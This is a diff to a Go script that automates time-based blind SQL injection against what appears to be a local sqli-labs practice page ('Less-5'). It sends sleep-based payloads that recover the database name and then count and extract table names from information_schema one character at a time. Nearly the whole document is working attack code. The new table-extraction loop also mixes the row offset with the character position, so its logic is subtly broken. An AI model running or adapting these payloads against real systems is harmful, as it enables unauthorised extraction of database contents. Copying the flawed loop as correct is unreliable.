@@ -10,37 +10,42 @@ import (
 
 var letters map[int]string = make(map[int]string)
 var cost bool = false
+var tbNames = ""
 
 func main() {
-	stringDb := "" // database
-	/*stringTb := "" // tables
+	dbName := "" // database
+	//dbLength:=1  // database length
+	/*tbNames := "" // tables
 	stringCl := "" // columns
 	stringDa := "" // columns data
 	chanDB := make(chan string)*/
 	letter()
-	Length := 0
-	for i := 3; i < 50; i++ {
-		url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(length(database())=%27" + strconv.Itoa(i) + "%27,sleep(3),1)%20--%20d"
-		payload(url)
-		if cost {
-			Length = i
-		}
-	}
-re:
-	for i := 1; i <= Length; i++ {
-		for _, letter := range letters {
-			str := stringDb
-			str += letter
-			url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left(database()," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
+	/*for  {
+			url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(length(database())=%27" + strconv.Itoa(dbLength) + "%27,sleep(3),1)%20--%20d"
 			payload(url)
 			if cost {
-				stringDb += letter
-				continue re
+				break
+			}
+			dbLength++
+		}
+
+	re:
+		for i := 1; i <= dbLength; i++ {
+			for _, letter := range letters {
+				str := dbName
+				str += letter
+				url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left(database()," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
+				payload(url)
+				if cost {
+					dbName += letter
+					continue re
+				}
 			}
 		}
-	}
-
-	fmt.Println("databaseName:" + stringDb)
+	*/
+	tablesName()
+	fmt.Println("databaseName:" + dbName)
+	fmt.Println("Table Name:" + tbNames)
 }
 
 func letter() {
@@ -68,4 +73,41 @@ func timeCost() func() {
 			cost = true
 		}
 	}
+}
+
+func tablesName() string {
+	i := 0
+	for {
+		tabnumUrl := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if((select%20count(table_name)from%20information_schema.tables%20where%20table_schema=database())=" + strconv.Itoa(i) + ",sleep(3),1)%20--%20d"
+		payload(tabnumUrl)
+		if cost {
+			break
+		}
+		i++
+	}
+	namelen := 1
+	for {
+		tabNameLenUrl := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20" +
+			"if(length((select%20table_name%20from%20information_schema.tables" +
+			"%20where%20table_schema=database()%20limit%200,1))=" + strconv.Itoa(namelen) + ",sleep(3),1)%20--%20d"
+		payload(tabNameLenUrl)
+		if cost {
+			break
+		}
+		namelen++
+	}
+loop:
+	for i := 1; i <= namelen; i++ {
+		for _, letter := range letters {
+			str := tbNames
+			str += letter
+			tabNameUrl := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20" + strconv.Itoa(i) + ",1)," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
+			payload(tabNameUrl)
+			if cost {
+				tbNames += letter
+				continue loop
+			}
+		}
+	}
+	return tbNames
 }
